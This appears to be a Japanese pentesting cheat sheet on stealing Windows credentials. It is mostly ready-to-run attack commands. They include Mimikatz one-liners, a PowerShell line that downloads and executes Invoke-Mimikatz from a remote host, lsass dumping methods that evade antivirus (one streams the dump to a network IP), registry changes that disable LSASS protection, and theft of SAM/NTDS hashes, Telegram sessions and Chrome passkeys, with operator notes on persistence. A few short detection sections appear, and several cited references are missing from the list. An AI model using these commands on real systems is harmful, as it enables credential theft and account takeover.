# Windows認証情報の窃取

{{#include ../../banners/hacktricks-training.md}}

## 認証情報 Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Mimikatzでできるその他のことについては** [**このページ**](credentials-mimikatz.md)**を参照してください。**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**考えられる認証情報の保護対策についてはこちらをご覧ください。**](credentials-protections.md) **これらの保護対策により、Mimikatz による一部の認証情報の抽出を防げる可能性があります。**

## Meterpreter での認証情報

私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)を使って、被害者のシステム内の**パスワードとハッシュを検索**します。

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV の回避

### Procdump + Mimikatz

[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**の Procdump は正規の Microsoft ツールであるため**、Defender に検知されません。\
このツールを使って **lsass プロセスを dump し**、**dump をダウンロードして**、dump から **認証情報をローカルで抽出**できます。

[SharpDump](https://github.com/GhostPack/SharpDump) も使用できます。

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) によって自動的に実行されます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注**: 一部の **AV** は、**procdump.exe を使用して lsass.exe をダンプする**操作を**悪意のあるものとして検知**する可能性があります。これは、**「procdump.exe」と「lsass.exe」という文字列を検知**しているためです。そのため、**lsass.exe という名前ではなく**、lsass.exe の **PID** を **引数として procdump に渡す**ほうが、より**ステルス性が高く**なります。

### **comsvcs.dll** を使った lsass のダンプ

`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ時に**プロセスのメモリをダンプする**役割を担います。この DLL には **`MiniDumpW`** という**関数**が含まれており、`rundll32.exe` を使って呼び出すように設計されています。\
最初の2つの引数は何を指定しても構いませんが、3つ目の引数は3つの要素に分かれています。1つ目はダンプ対象のプロセス ID、2つ目はダンプファイルの保存先、3つ目は必ず **full** です。他の選択肢はありません。\
この3つの要素が解析されると、DLL はダンプファイルの作成を開始し、指定されたプロセスのメモリをそのファイルに書き込みます。\
**comsvcs.dll** を使って lsass プロセスをダンプできるため、procdump をアップロードして実行する必要はありません。この手法の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) を参照してください。<sup>[[9]](#references)</sup>

実行には次のコマンドを使用します:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**[**lssasy**](https://github.com/Hackndo/lsassy)** を使ってこのプロセスを自動化できます。**

### **Task Manager を使った lsass のダンプ**

1. タスクバーを右クリックし、Task Manager をクリックします
2. More details をクリックします
3. Processes タブで「Local Security Authority Process」プロセスを探します
4. 「Local Security Authority Process」プロセスを右クリックし、「Create dump file」をクリックします

### procdump を使った lsass のダンプ

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/) スイートの一部である、Microsoft 署名済みバイナリです。

既存のシステム全体のクラッシュダンプや、アクセス可能なユーザーフォルダーにある圧縮コピーには、オフライン分析用の認証情報が残っている可能性があります。`MEMORY.DMP` や `MEMORY.7z` のようなファイル名は、確認対象の手がかりにすぎません。出所とアクセス権を確認し、利用可能または最新の認証情報が含まれていると決めつけないでください。

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## PPLBladeを使ったlsassのダンプ

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)は、メモリダンプを難読化し、ディスクに保存せずにリモートワークステーションへ転送できるProtected Process Dumper Toolです。

**主な機能**:

1. PPL保護の回避
2. Defenderのシグネチャベースの検出メカニズムを回避するためのメモリダンプファイルの難読化
3. ディスクに保存せず、RAWおよびSMBのアップロード方式を使ってメモリダンプをアップロード（fileless dump）

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – MiniDumpWriteDump を使わない SSP ベースの LSASS ダンプ

Ink Dragon は、`MiniDumpWriteDump` を一度も呼び出さない 3 段階の dumper、**LalsDumper** を使用しています。そのため、この API に対する EDR のフックは発動しません:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` 内で、32 個の小文字 `d` からなるプレースホルダーを検索し、`rtu.txt` の絶対パスで上書きします。パッチ済み DLL を `nfdp.dll` として保存し、`AddSecurityPackageA("nfdp","fdp")` を呼び出します。これにより、**LSASS** は悪意のある DLL を新しい Security Support Provider (SSP) としてロードします。
2. **LSASS 内の Stage 2** – LSASS が `nfdp.dll` をロードすると、この DLL は `rtu.txt` を読み込み、各バイトを `0x20` で XOR し、デコードした blob をメモリにマッピングしてから実行を移します。
3. **Stage 3 dumper** – マッピングされた payload は、ハッシュ化された API 名から解決した **direct syscalls** を使って MiniDump のロジックを再実装します (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`)。専用の export である `Tom` は `%TEMP%\<pid>.ddt` を開き、圧縮した LSASS dump をファイルに書き込み、ハンドルを閉じます。その後、exfiltration が可能になります。

Operator のメモ:

* `lals.exe`、`fdp.dll`、`nfdp.dll`、`rtu.txt` は同じディレクトリに置いてください。Stage 1 はハードコードされたプレースホルダーを `rtu.txt` の絶対パスで書き換えるため、別々の場所に置くと chain が壊れます。
* 登録時には、`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` に `nfdp` を追加します。この値を自分で設定しておけば、起動のたびに LSASS が SSP を再ロードするようにできます。
* `%TEMP%\*.ddt` ファイルは圧縮された dump です。ローカルで解凍してから、認証情報の抽出に Mimikatz/Volatility を使用してください。
* `AddSecurityPackageA` を成功させるには、`lals.exe` の実行に admin/SeTcb 権限が必要です。呼び出しが返ると、LSASS は不正な SSP を透過的にロードし、Stage 2 を実行します。
* ディスクから DLL を削除しても、LSASS からはアンロードされません。レジストリエントリを削除して LSASS を再起動 (再起動) するか、長期 persistence のために残しておいてください。

## CrackMapExec

### SAM hash のダンプ

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### LSA secretsのダンプ

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### ターゲット DC から NTDS.dit を Dumpする

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### target DCからNTDS.ditのパスワード履歴をDumpする

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### 各 NTDS.dit アカウントの pwdLastSet 属性を表示する

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM & SYSTEMの窃取

これらのファイルは _C:\windows\system32\config\SAM_ および _C:\windows\system32\config\SYSTEM._ に**配置**されています。しかし、保護されているため、通常の方法で単純にコピーすることはできません。

### レジストリから

これらのファイルを窃取する最も簡単な方法は、レジストリからコピーを取得することです。

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**それらのファイルを**Kaliマシンに**ダウンロードし、次のコマンドでハッシュを抽出します**:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

このサービスを使用して、保護されたファイルをコピーできます。Administrator 権限が必要です。

#### Using vssadmin

vssadmin バイナリは Windows Server のバージョンでのみ利用できます。

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

ただし、**Powershell**からも同じことができます。これは**SAMファイルをコピーする方法**の例です（使用するハードドライブは「C:」で、C:\users\Publicに保存されます）が、保護されたファイルなら何でもコピーできます。

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

書籍のコード: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)を使って、SAM、SYSTEM、ntds.ditのコピーを作成することもできます。

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory 認証情報 - NTDS.dit**

**NTDS.dit** ファイルは **Active Directory** の中核として知られており、ユーザーオブジェクトやグループ、そのメンバーシップに関する重要なデータを保持しています。ドメインユーザーの **password hash** が保存されているファイルです。このファイルは **Extensible Storage Engine (ESE)** データベースであり、**_%SystemRoom%/NTDS/ntds.dit_** にあります。

このデータベースでは、主に次の3つのテーブルが管理されています。

- **Data Table**: ユーザーやグループなどのオブジェクトの詳細を格納します。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: 各オブジェクトの **security descriptor** を保持し、保存されたオブジェクトのセキュリティとアクセス制御を担います。

Christoffer Andersson によるデータベース層の調査では、これらのテーブルとバージョンごとの動作について、さらに詳しく説明されています。<sup>[[8]](#references)</sup>

Windows は _Ntdsa.dll_ を使ってこのファイルとやり取りし、_lsass.exe_ がこれを使用します。そのため、**NTDS.dit** ファイルの**一部**が **`lsass` のメモリ内**に存在する場合があります（パフォーマンス向上のため **cache** が使用されていることから、直近にアクセスされたデータが見つかる可能性があります）。

#### NTDS.dit 内の hash を復号する

hash は3回復号されます。

1. **BOOTKEY** と **RC4** を使って Password Encryption Key (**PEK**) を復号する。
2. **PEK** と **RC4** を使って **hash** を復号する。
3. **DES** を使って **hash** を復号する。

**PEK** はすべてのドメインコントローラーで**同じ値**ですが、そのドメインコントローラーの **SYSTEM** ハイブにある、DC固有の **BOOTKEY** を使って **NTDS.dit** 内で**暗号化**されています。そのため、認証情報を抽出するには **NTDS.dit** と **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) の両方が必要です。

### Ntdsutil を使用して NTDS.dit をコピーする

Windows Server 2008 から利用できます。

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

[**volume shadow copy**](#stealing-sam-and-system) の手法を使って、**ntds.dit** ファイルをコピーすることもできます。また、**SYSTEM file** のコピーも必要になることを忘れないでください（同じく、[**レジストリからダンプするか、volume shadow copy の手法を使ってください**](#stealing-sam-and-system)）。

### **NTDS.dit からハッシュを抽出する**

**NTDS.dit** と **SYSTEM** のファイルを**取得したら**、_secretsdump.py_ などのツールを使って**ハッシュを抽出**できます。

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

有効なドメイン管理者ユーザーを使用して、それらを自動的に**抽出する**こともできます：

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

**大きな NTDS.dit ファイル**は、[gosecretsdump](https://github.com/c-sto/gosecretsdump) を使って抽出することをおすすめします。

最後に、**metasploit module**の _post/windows/gather/credentials/domain_hashdump_ または **mimikatz** の `lsadump::lsa /inject` も使用できます。

### **NTDS.dit からドメインオブジェクトを抽出して SQLite データベースに格納する**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使うと、NTDS オブジェクトを SQLite データベースに抽出できます。秘密情報だけでなく、NTDS.dit ファイルをすでに取得している場合にさらに情報を抽出できるよう、オブジェクト全体とその属性も抽出されます。

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive は必須ではありませんが、秘密情報（NT および LM ハッシュ、クリアテキストのパスワード、Kerberos キーや信頼キーなどの補足資格情報、NT および LM パスワード履歴）の復号に使用できます。その他の情報とともに、以下のデータが抽出されます。ハッシュを含むユーザーアカウントとマシンアカウント、UAC フラグ、最終ログオンおよびパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループと再帰的なメンバーシップ、組織単位のツリーとメンバーシップ、信頼の種類、方向、属性を含む信頼済みドメインなどです。

## Lazagne

[こちら](https://github.com/AlessandroZ/LaZagne/releases)からバイナリをダウンロードしてください。このバイナリを使用すると、複数のソフトウェアから資格情報を抽出できます。

```
lazagne.exe all
```

## SAM と LSASS から認証情報を抽出するその他のツール

### Windows credentials Editor (WCE)

このツールを使用すると、メモリから認証情報を抽出できます。ダウンロード先: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM ファイルから認証情報を抽出します。

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAM ファイルから認証情報を抽出する

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

こちらからダウンロードし：[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7)、**実行するだけ**でパスワードが抽出されます。

## アイドル状態のRDPセッションの調査とセキュリティ制御の弱体化

Ink DragonのFinalDraft RATには、あらゆるred-teamerに役立つ手法を備えた`DumpRDPHistory` taskerが含まれています：<sup>[[3]](#references)</sup>

### DumpRDPHistory形式のテレメトリ収集

* **送信先RDPターゲット** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`にあるすべてのユーザーハイブを解析します。各サブキーには、サーバー名、`UsernameHint`、最終書き込みタイムスタンプが格納されています。PowerShellを使ってFinalDraftのロジックを再現できます。

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Inbound RDP の証跡** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` ログを Event ID **21**（ログオン成功）および **25**（切断）で検索し、誰がそのマシンを管理していたかを特定します:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

接続する Domain Admin を特定したら、その **切断済み** セッションがまだ存在する間に、LalsDumper/Mimikatz で LSASS をダンプします。CredSSP + NTLM fallback によって、そのユーザーの verifier と tokens が LSASS に残るため、それらを SMB/WinRM 経由で再利用して `NTDS.dit` を取得したり、ドメインコントローラー上に永続化を仕掛けたりできます。

### FinalDraft が標的とするレジストリのダウングレード

同じ implant は、認証情報の窃取を容易にするため、複数のレジストリキーも改ざんします:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` は受信 RDP の Restricted Admin を無効にします。このモードで pass-the-hash を有効にするものではありません。値を `0` に設定すると接続先で Restricted Admin が許可されますが、クライアントが `/RestrictedAdmin` を要求するか、Restricted Admin を必須とするポリシーを使用する必要があります。<sup>[[14]](#references)</sup> ハッシュだけではリモート管理者権限は付与されません。[RDP authentication prerequisites](../../network-services-pentesting/pentesting-rdp.md) を参照してください。<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` は UAC のトークンフィルタリングを無効にし、ローカル管理者がネットワーク経由で制限のないトークンを取得できるようにします。
* `DSRMAdminLogonBehavior=2` は DC がオンラインの間、DSRM 管理者のログオンを許可し、攻撃者にもうひとつの組み込み高権限アカウントを与えます。
* `RunAsPPL=0` は LSASS PPL の保護を解除し、LalsDumper などのダンプツールによるメモリへのアクセスを容易にします。

## hMailServer の設定認証情報（侵害後）

インストール構成に応じて、正確な設定ファイル `C:\Program Files\hMailServer\Bin\hMailServer.ini`、`C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`、および `C:\ProgramData\hMailServer\hMailServer.ini` を確認してください。読み取り可能で空でない `[Security] AdministratorPassword=` の値は、hMailServer の管理者パスワードハッシュです。Windows Administrator のパスワードである証拠ではありません。この認証情報を回収しても、Windows アカウントへのピボットには、パスワードの再利用とログオン権限を個別に確認する必要があります。

SQL CE データベースを使用するインストールでは、INI 内の別の `[Database] Password=` の値がデータベースを保護します。古いインストールでは、この値は静的キー `THIS_KEY_IS_NOT_SECRET` と4バイト単位のエンディアン入れ替えを使って Blowfish で暗号化されています。INI 内の16進文字列を使い、次の Python スニペットを実行してください。<sup>[[2]](#references)</sup>

まず、現在のアカウントが INI と対応する SQL CE `.sdf` データベースの**両方**を読み取れることを確認してください。INI のパスワードはデータベースを保護するもので、データベース内に保存されているメールボックスアカウントのハッシュとは別のものです。使用中のデータベースを調査またはアップグレードする際は、必ず**コピー**を使用し、稼働中のファイルを使わないでください。

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

平文パスワードを使って、ファイルロックを避けるために SQL CE データベースをコピーし、32-bit プロバイダーを読み込み、必要に応じてアップグレードしてからハッシュを照会します：

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

`accountpassword` 列では hMailServer の hash format（hashcat mode `1421`）が使用されています。クラックしたメールボックスのパスワードが Windows user pivot に使えるのは、そのパスワードがローカル/ドメインアカウントでも再利用されており、そのアカウントに必要なリモートログオン権限がある場合に限られます。

## LSA Logon Callback Interception (LsaApLogonUserEx2)

一部のツールは、LSA logon callback `LsaApLogonUserEx2` を傍受して**plaintext logon passwords**を取得します。この手法では、認証パッケージの callback を hook または wrap し、認証情報を**ログオン中**（hash 化される前）に取得してから、ディスクに書き込むか operator に返します。一般的には、LSA に inject するか登録する helper として実装され、成功した各 interactive/network logon event の username、domain、password を記録します。<sup>[[1]](#references)</sup>

運用上の注意:
- 認証経路に helper を読み込むには、local admin/SYSTEM 権限が必要です。
- 取得した認証情報が現れるのは、ログオン（hook に応じて interactive、RDP、service、または network logon）が発生した場合のみです。

## SSMS の保存済み接続認証情報 (sqlstudio.bin)

SQL Server Management Studio (SSMS) は、ユーザーごとの `sqlstudio.bin` ファイルに保存済み接続情報を格納します。専用の dumper を使うと、このファイルを解析して保存済み SQL 認証情報を復元できます。コマンド出力しか返さない shell では、ファイルを Base64 でエンコードして stdout に出力し、持ち出すことがよくあります。<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

オペレーター側でファイルを再構築し、dumperをローカルで実行して認証情報を復元します。

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Chrome DevTools Protocol を介したブラウザーセッションと cookie の窃取

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Telegram Desktop の `tdata` セッション窃取

Telegram Desktop は、認証情報とアカウント状態を **`tdata`** ディレクトリに保存します。コピーしたセッションは互換性のあるツールで読み込むことで、その認証が有効な間はアカウントのパスワードなしで認証できます。ローカルデータの暗号化が有効な場合、stealer はパスコードも必要です。認証済みセッションからは、ID データ、ダイアログやメンバーシップのメタデータ、メッセージ、ダウンロード可能なメディアを取得できます。<sup>[[10]](#references)</sup>

### 発見と取得

インストール版とポータブル版の両方の配置を検索します。Microsoft Store のパッケージ名は異なるため、`TelegramMessenge` を含むパッケージディレクトリを列挙し、その `LocalCache\Roaming` サブツリーを調べます。<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

通常の読み取りに失敗し、プロセストークンに `SeBackupPrivilege` が**すでに含まれ、有効化されている**場合は、バックアップ対応のアクセスがフォールバックとして利用できます。ただし、これによって特権を取得したり、プロセスを昇格させたりすることはありません。`FILE_FLAG_BACKUP_SEMANTICS` を指定した `CreateFileW` は、必要なトークン特権が存在する場合にバックアップ／復元セマンティクスを要求し、ファイルのセキュリティチェックを上書きできますが、このフラグだけでは、互換性のない共有ロックを回避できません。<sup>[[10]](#references)[[11]](#references)</sup>

使用中でロックされたファイルには **Volume Shadow Copy** を作成して読み取ります。ACL によってアクセスが拒否されるファイルには、`robocopy /B` を使うと、backup mode でファイルとディレクトリの ACL を上書きできます。<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

帯域幅を意識したimplantは、まずファイルパスの一覧だけを送信し、C2にすでに保存されているパスとsnapshot identifierを受け取ってから、不足しているファイルだけをアップロードすることがあります。そのため、再帰的な` tdata`の列挙後に小規模な増分転送が行われていても、セッション窃取が成功している可能性があります。<sup>[[10]](#references)</sup>

### 検知と封じ込め

Telegram以外のプロセスによる`tdata`への再帰的なアクセスを、`SeBackupPrivilege`の有効化、バックアップセマンティクスを指定したファイルオープン、VSSのアクティビティ、または`/B`を使用する子プロセスの`robocopy.exe`と相関させます。また、`%APPDATA%`と`%LOCALAPPDATA%\Packages`の両方を急速に列挙した後、同じプロセスから外部接続が発生していないかも調査します。侵害後は、**設定 → デバイス**（または**プライバシーとセキュリティ → アクティブなセッション**）から不審なセッションを終了します。2段階認証を有効にしても、すでに窃取された認証は失効しません。<sup>[[10]](#references)[[13]](#references)</sup>

## Windows上のChromeからのPasskeys / WebAuthn認証情報の窃取

**Chrome + Google Password Managerで同期されたpasskey**を使用するWindowsホストで、**被害ユーザー**としてコード実行を得た場合、**admin/SYSTEM権限がなくても**passkeyは興味深いpost-exploitationの標的となります。<sup>[[4]](#references)</sup>

### 興味深いローカルアーティファクト

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** には、protobufでエンコードされた **`WebauthnCredentialSpecifics`** レコードが保存されます。同一ユーザー権限のプロセスは、同期されたpasskeyの **RP ID**、**ユーザー名**、**credential ID**、暗号化された秘密鍵のデータを列挙できます。<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** には、**`wrapped_identity_private_key`** や同期された認証情報の復元に使うラップ済みシークレットなど、ローカルデバイスの登録状態が保存されます。<sup>[[4]](#references)</sup>

簡易トリアージ：

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-bound key blobs は、ローカルの署名オラクルとして悪用される可能性がある

ブラウザーがTPM-backed identity keyを **`NCRYPT_OPAQUE_KEY_BLOB`** としてエクスポートし、そのblobをユーザーがアクセスできる状態で保存している場合、マルウェアはraw private keyを抽出する必要はありません。同じマシン上でblobを再インポートし、攻撃者が制御するデータへの署名をローカルTPMに要求するだけです:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

これは、**hardware bindingによってデバイス外へのエクスポートは防げるものの、侵害されたエンドポイント上で同じユーザーが使用することは防げない**ことを意味します。

### 実際に悪用される経路

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - ChromeのLevelDBから`WebauthnCredentialSpecifics`を列挙する。
   - passkeyログインを開始し、新しいWebAuthn challengeを取得する。
   - 盗んだ`wrapped_identity_private_key` blobを被害者のTPM上で使用し、cloud-authenticatorリクエストのbindingに署名する。
   - 返されたassertionをrelying partyにリレーする。
   - RPが`userVerification=preferred`を受け入れる場合や、**`UV=0`**のassertionを拒否しない場合、特に有効な手法となる。
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - `passkey_enclave_state`を削除するか、有効な署名付き`device/forget`操作を送信して、再オンボーディングを強制する。
   - オンボーディング後もデバイスが**`uv_key_pending`**の状態であれば、攻撃者が管理するUV公開鍵を登録する。
   - プロバイダーが新しいUV keyのattestation / secure-hardware originを検証しない場合、以降の攻撃者の鍵による署名は**`UV=1`**として扱われる。
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
   - Chromeが同期されたpasskeyのmaster secretを取得するよう、recoveryまたは再参加を強制する。
   - `passkey_enclave_state`の再作成や変更を監視し、平文の**security domain secret (SDS)**がメモリ上に存在する間にChromeのメモリをダンプする。
   - 取得したSDSを使って、すべての`WebauthnCredentialSpecifics`レコード内の暗号化フィールドを復号し、持ち運び可能なWebAuthn秘密鍵を復元する。

### DFIR / 検知のアイデア

- `passkey_enclave_state`の**削除・再作成**を監視する。<sup>[[4]](#references)</sup>
- ブラウザー以外のプロセスによるChromeの**`Sync Data\LevelDB`**への異常なアクセスを検知する。
- **Chromeのメモリダンプ**や、疑わしいプロセス間メモリアクセスを検知する。
- **Google Password Managerのrecovery PIN**の繰り返し要求や、予期しない再オンボーディングを調査する。
- WebAuthnの**`signCount`**は、同期されたpasskeyでは一定のままとなる場合があり、役に立たないことが多いため、従来のクローン検知は有効性が低い点に注意する。

## References

- [1] [Unit 42 – 高価値セクターを標的とした、長年検知されなかった活動の調査](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
